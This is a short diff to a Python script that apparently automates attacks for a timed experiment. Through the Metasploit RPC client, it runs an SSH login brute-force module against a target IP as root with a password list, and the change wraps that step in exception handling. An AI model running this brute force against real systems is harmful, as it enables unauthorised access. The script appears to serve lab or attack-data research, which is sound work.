@@ -25,15 +25,20 @@ def main(argv):
     # put the attack launch command
     client = MsfRpcClient('kali')
 
-    # put the attack launch command
-    auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
-    auxiliary['PASS_FILE'] = "/home/attacker-server/Desktop/reinstall/unix_passwords_modified.txt"
-    auxiliary['USERNAME'] = "root"
-    auxiliary['RHOSTS'] = target_ip
-    auxiliary['RPORT'] = 22
+    try:
+        # put the attack launch command
+        auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
+        auxiliary['PASS_FILE'] = "/home/attacker-server/Desktop/reinstall/unix_passwords_modified.txt"
+        auxiliary['USERNAME'] = "root"
+        auxiliary['RHOSTS'] = target_ip
+        auxiliary['RPORT'] = 22
     
-    auxiliary.execute()
+        auxiliary.execute()
 
+    except Exception as e:
+        print(e)
+        pass
+    
     time.sleep(30)
     output_time_file_end = 'time_step_2_end.txt'
     record_timestamp(folder, output_time_file_end)
